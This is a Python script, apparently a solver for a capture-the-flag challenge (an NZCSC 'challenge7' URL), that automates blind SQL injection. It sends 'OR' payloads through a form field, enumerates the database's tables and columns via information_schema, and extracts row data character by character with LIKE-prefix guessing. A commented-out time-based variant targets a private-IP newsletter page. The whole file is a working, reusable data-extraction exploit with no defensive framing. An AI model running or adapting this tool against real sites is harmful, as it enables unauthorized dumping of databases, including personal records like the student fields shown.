import time
import requests
import urllib.parse
from typing import List, Tuple, Union


MISSING = ['###MISSING###']
alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789 /?.,<>;:'"`[]{}\\~!@#$%^&*()-_=+"


def main():
    enum_all()


def enum_selected():
    test()
    tables = get_all_tables()
    print(tables)
    table_name = input("Enter table name to search")
    columns = get_all_columns(table_name)
    print(columns)
    pivot_col = input("Select pivot column:")
    get_data_from_table(table_name, columns, pivot_col)


def enum_all():
    test()
    tables = get_all_tables()
    print(tables)
    for table_name in tables:
        print(f'Table: {table_name}, getting columns')
        columns = get_all_columns(table_name)
        print(columns)
        pivot_col = input("Select pivot column:")
        get_data_from_table(table_name, columns, pivot_col)


def csc_example():
    table_name = 'tsebehtsiworc'
    columns = ['id', 'grade', 'school', 'surname', 'admin_no']

    get_data_from_table(table_name, columns)


def make_query(payload: str) -> bool:
    """
    Queries the sql database and returns true or false according to payload
    :param payload: string to evaluate by the database
    :return: true or false depending on query result
    """
    # for debugging
    # print(payload)

    start = time.time()
    # r = requests.get(f"http://10.10.10.10/newsletter.php?name=t&email=t' OR IF({format_payload(payload)}, sleep(0.1), 'NO') AND '1'='1")
    r = requests.post("https://r0.nzcsc.org.nz/challenge7/", data=f"firstn=a%27+OR+{url_encode(payload)}+--+&subit=Check", headers={'Content-Type': 'application/x-www-form-urlencoded'})
    end = time.time()

    # if "yes" in r.text:        # boolean example
    # if end - start >= 0.1:     # blind example
    if "No rows returned" not in r.text:
        # print(f'T {payload}')
        return True
    else:
        # print(f'F {payload}')
        return False


class AlreadyKnowns:
    def __init__(self, already_knowns: List[Tuple[str, str]] = None, raw: str = None):
        self._already_knowns = [] if already_knowns is None else already_knowns  # type: List[Tuple[str, str]]
        self._raw = raw

    def add(self, col_name: str, col_value: str) -> None:
        self._already_knowns.append((col_name, col_value))

    def get_escaped_str(self) -> str:
        if self._raw is not None:
            return self._raw
        result = ''
        if self._already_knowns is not None and len(self._already_knowns) > 0:
            for already_known in self._already_knowns:
                col = escape_sql(already_known[0])
                value = escape_sql(already_known[1])
                result += f" AND `{col}`='{value}'"
        return result


def make_like_query(table_name: Union[tuple, str], col_name: str, likened_value: str, already_knowns: AlreadyKnowns = None, threshold_n: int = 0) -> bool:
    payload = f"(SELECT COUNT(*) FROM `{escape_sql(table_name)}` WHERE `{escape_sql(col_name)}` LIKE '{escape_sql(likened_value, True)}%'"

    if already_knowns is not None:
        payload += already_knowns.get_escaped_str()

    payload += f')>{threshold_n}'
    return make_query(payload)


def make_match_query(table_name: Union[tuple, str], col_name: str, exact_value: str, already_knowns: AlreadyKnowns = None) -> bool:
    payload = f"(SELECT COUNT(*) FROM `{escape_sql(table_name)}` WHERE `{escape_sql(col_name)}`='{escape_sql(exact_value)}'"

    if already_knowns is not None:
        payload += already_knowns.get_escaped_str()
    payload += ')>0'

    return make_query(payload)


def enum_data_for_table(table_name: Union[tuple, str], col_name: str, data_found: List[str] = None, previous_guess: str = "", only_one_left=False, already_knowns: AlreadyKnowns = None) -> List[str]:
    if data_found is None:
        data_found = []
    if not only_one_left and not make_like_query(table_name, col_name, previous_guess, already_knowns, threshold_n=1):
        only_one_left = True
    for c in alphabet:
        current_guess = previous_guess + c
        print(f'\r{current_guess}', end='')
        if make_like_query(table_name, col_name, current_guess, already_knowns):
            if make_match_query(table_name, col_name, current_guess, already_knowns):
                data_found.append(current_guess)
                print(f'\rFound: "{current_guess}"')
                if only_one_left:
                    return data_found
                elif not make_like_query(table_name, col_name, current_guess, already_knowns, threshold_n=1):
                    continue  # if there's only one left and we find it, don't got down
            enum_data_for_table(table_name, col_name, data_found, current_guess, only_one_left, already_knowns)
            if only_one_left:  # if there's only one left then don't carry on cracking just go down one branch
                return data_found
    return data_found


def get_all_tables() -> List[str]:
    tables = enum_data_for_table(('information_schema', 'tables'), 'table_name', already_knowns=AlreadyKnowns(raw='AND table_schema=DATABASE()'))
    print('\r', end='')
    return tables


def get_all_columns(table_name: str) -> List[str]:
    columns = enum_data_for_table(('information_schema', 'columns'), 'column_name', already_knowns=AlreadyKnowns(raw=f"AND table_schema=DATABASE() AND table_name='{escape_sql(table_name)}'"))
    print('\r', end='')
    return columns


def get_data_from_table(table_name: str, columns: List[str], pivot_column: str = None):
    if pivot_column is None:
        pivot_column = columns[0]
    columns = columns.copy()
    columns.remove(pivot_column)
    columns.insert(0, pivot_column)
    table_data = [enum_data_for_table(table_name, pivot_column)]  # type: List[List[str]]
    for col_i in range(1, len(columns)):
        table_col = []
        table_data.append(table_col)
        for row_i in range(len(table_data[0])):
            already_knowns = AlreadyKnowns()
            for col_j in range(len(table_data) - 1):
                value = table_data[col_j][row_i]
                if value != MISSING:
                    already_knowns.add(columns[col_j], value)
            cell_value_list = enum_data_for_table(table_name, columns[col_i], already_knowns=already_knowns, only_one_left=True)
            if len(cell_value_list) == 1:
                table_col.append(cell_value_list[0])
            else:
                table_col.append(MISSING)
            print_table(columns, table_data)


def print_table(columns: List[str], table_data: List[List[str]]):
    table_data_transposed = []
    for row_i in range(len(table_data[0])):
        row = []
        try:
            for col_i in range(len(table_data)):
                row.append(table_data[col_i][row_i])
        except IndexError:
            pass
        table_data_transposed.append(row)

    print_data = [columns] + table_data_transposed

    print('\r===========================================')
    for row in print_data:
        print_str = ''
        for item in row:
            if isinstance(item, list):
                item = item[0]
            print_str += item.ljust(20)[:20]
        print(print_str)
    print("=============================================\n")


def test():
    if not make_query('1=1'):
        print('Error: 1=1 test query failed')
        exit(1)
    if make_query('1=2'):
        print('Error: 1=2 test query failed')
        exit(2)
    print('Initial test passed...')


def escape_sql(string_to_escape: Union[tuple, str], like: bool = False) -> str:
    replace_chars = ['\\', "'", '"', '`']
    replace_chars += ['%', '_'] if like else []

    if isinstance(string_to_escape, str):
        for replace_char in replace_chars:
            string_to_escape = string_to_escape.replace(replace_char, '\\' + replace_char)
        return string_to_escape

    else:
        return '`.`'.join([escape_sql(i, like) for i in string_to_escape])


def url_encode(payload: str) -> str:
    return urllib.parse.quote(payload)


if __name__ == '__main__':
    main()
